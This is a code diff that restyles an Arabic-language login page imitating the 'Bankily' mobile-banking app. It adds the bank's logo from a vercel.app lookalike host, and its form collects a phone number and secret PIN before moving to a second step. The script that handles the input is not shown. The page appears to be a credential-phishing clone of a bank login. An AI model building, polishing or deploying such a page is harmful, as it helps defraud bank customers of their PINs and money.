@@ -8,42 +8,53 @@
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
         body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
         .wrapper { width: 100%; max-width: 450px; background: #fff; padding-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .form-container { padding: 20px; text-align: right; }
-        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
+        .form-container { padding: 25px; text-align: right; }
         
-        /* إزالة الفراغات غير الضرورية */
-        .pin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
-        .forgot-pass { font-size: 14px; color: #1a5e20; font-weight: bold; cursor: pointer; text-decoration: underline; }
+        /* الشعار */
+        .logo-container { text-align: center; margin-top: 30px; margin-bottom: 20px; }
+        .logo { width: 250px; }
 
-        .input-box { position: relative; border: 1.5px solid #1a5e20; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; padding: 5px 15px; }
-        input { border: none; width: 100%; font-size: 17px; padding: 12px; outline: none; background: transparent; font-family: 'Cairo'; }
+        .label { font-weight: bold; margin-bottom: 10px; display: block; font-size: 15px; color: #333; }
         
-        .register-container { text-align: center; margin-top: 10px; }
-        .btn-yellow { background-color: #ffc107; color: #000; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; }
+        .input-box { position: relative; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 25px; display: flex; align-items: center; padding: 5px 15px; background: #fff; }
+        input { border: none; width: 100%; font-size: 17px; padding: 10px; outline: none; background: transparent; font-family: 'Cairo'; text-align: right; }
+        
+        /* الروابط */
+        .forgot-pass { font-size: 14px; color: #1a5e20; cursor: pointer; text-decoration: underline; margin-bottom: 20px; display: block; }
+        .register-container { text-align: center; margin-top: 20px; margin-bottom: 20px; }
+        .register-link { font-size: 15px; color: #333; text-decoration: underline; cursor: pointer; font-weight: bold; }
+        
+        /* الزر الأصفر */
+        .btn-yellow { background-color: #ffc107; color: #000; border: none; width: 100%; padding: 18px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-yellow:hover { background-color: #e0a800; }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
+    <div class="logo-container">
+        <img src="https://bankily-ap.vercel.app/logo_bankily.jpeg" alt="Bankily Logo" class="logo">
+    </div>
+
     <div id="p1" class="form-container">
-        <label class="label">رقم الهاتف المربوط بالحساب *</label>
+        <label class="label">اسم المستخدم أو رقم الهاتف</label>
         <div class="input-box">
-            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8">
+            <input type="text" id="tel" placeholder="43168997">
         </div>
 
-        <div class="pin-header">
-            <label class="label">الرمز السري (PIN) *</label>
-            <span class="forgot-pass">نسيت الرقم السري؟</span>
-        </div>
+        <label class="label">الرقم السري</label>
         <div class="input-box">
-            <input type="password" id="pin" placeholder="أدخل الرمز السري" maxlength="4">
+            <input type="password" id="pin" placeholder="****">
         </div>
+
+        <span class="forgot-pass">نسيت الرقم السري؟</span>
 
         <div class="register-container">
-            <p style="font-size: 15px; font-weight: bold;">مستخدم جديد ؟ سجل الآن!</p>
-            <button class="btn-yellow" onclick="toStep2()">تسجيل الدخول</button>
+            <span class="register-link">مستخدم جديد ؟ سجل الآن!</span>
         </div>
     </div>
+
+    <button class="btn-yellow" onclick="toStep2()">تسجيل الدخول</button>
 </div>
 
 <script>
